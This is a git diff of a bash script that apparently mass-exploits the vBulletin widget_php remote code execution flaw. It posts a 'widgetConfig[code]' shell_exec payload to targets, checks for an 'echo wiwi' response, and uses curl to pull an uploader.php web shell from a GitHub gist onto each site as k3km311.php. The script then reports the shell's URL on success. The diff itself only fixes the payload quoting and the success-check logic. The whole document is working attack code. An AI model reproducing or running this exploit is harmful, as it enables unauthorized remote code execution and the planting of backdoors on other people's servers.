@@ -26,7 +26,8 @@ function Kerak(){
 	}
 function bababa(){ 
 	if [[ $chekweb =~ "1" ]]; then
-        gassx=$(curl -kL --silent "${x}" --request POST --data "https://gist.githubusercontent.com/widhisec/98a2d7e5c36d6ad88df14dd6ec08da05/raw/3a71897f3e6967dcc50ad98edff37664883d0e73/uploader.php' -o k3km311.php);" --output /dev/null -w "%{http_code}" )
+    shellname=k3km311.php
+        gassx=$(curl -kL --silent "${x}" --request POST --data "routestring=ajax/render/widget_php&widgetConfig[code]=echo shell_exec("curl https://gist.githubusercontent.com/widhisec/98a2d7e5c36d6ad88df14dd6ec08da05/raw/3a71897f3e6967dcc50ad98edff37664883d0e73/uploader.php -o "$shellname""); exit;" --output /dev/null -w "%{http_code}")
             gase=$(curl -kL --silent "${x}" --data "routestring=ajax/render/widget_php&widgetConfig[code]=echo shell_exec('echo wiwi');")
              grab=$(echo "$gase"| sed 's/\\r//g' | 
                 sed 's/\\t//g' | 
@@ -38,8 +39,8 @@ function bababa(){
     if [[ $gase =~ "wiwi" ]]; then
         	  printf "${WHITE}[${GREEN}VULN${GREEN}]${WHITE} ~ $x\n"	  
         	  echo -e "${WHITE}[${GREEN}MENCOBA UPLOAD..${GREEN}]${WHITE} ~"
-     fi
-           if [[ $gassx =~ "500" ]]; then
+     
+           elif [[ $gassx =~ "500" ]]; then
         	  printf "BERHASIL -> $x/k3km311.php\n"
       else
         	  printf "${WHITE}[${RED}NOTT VULN]${WHITE} ~ $x\n"
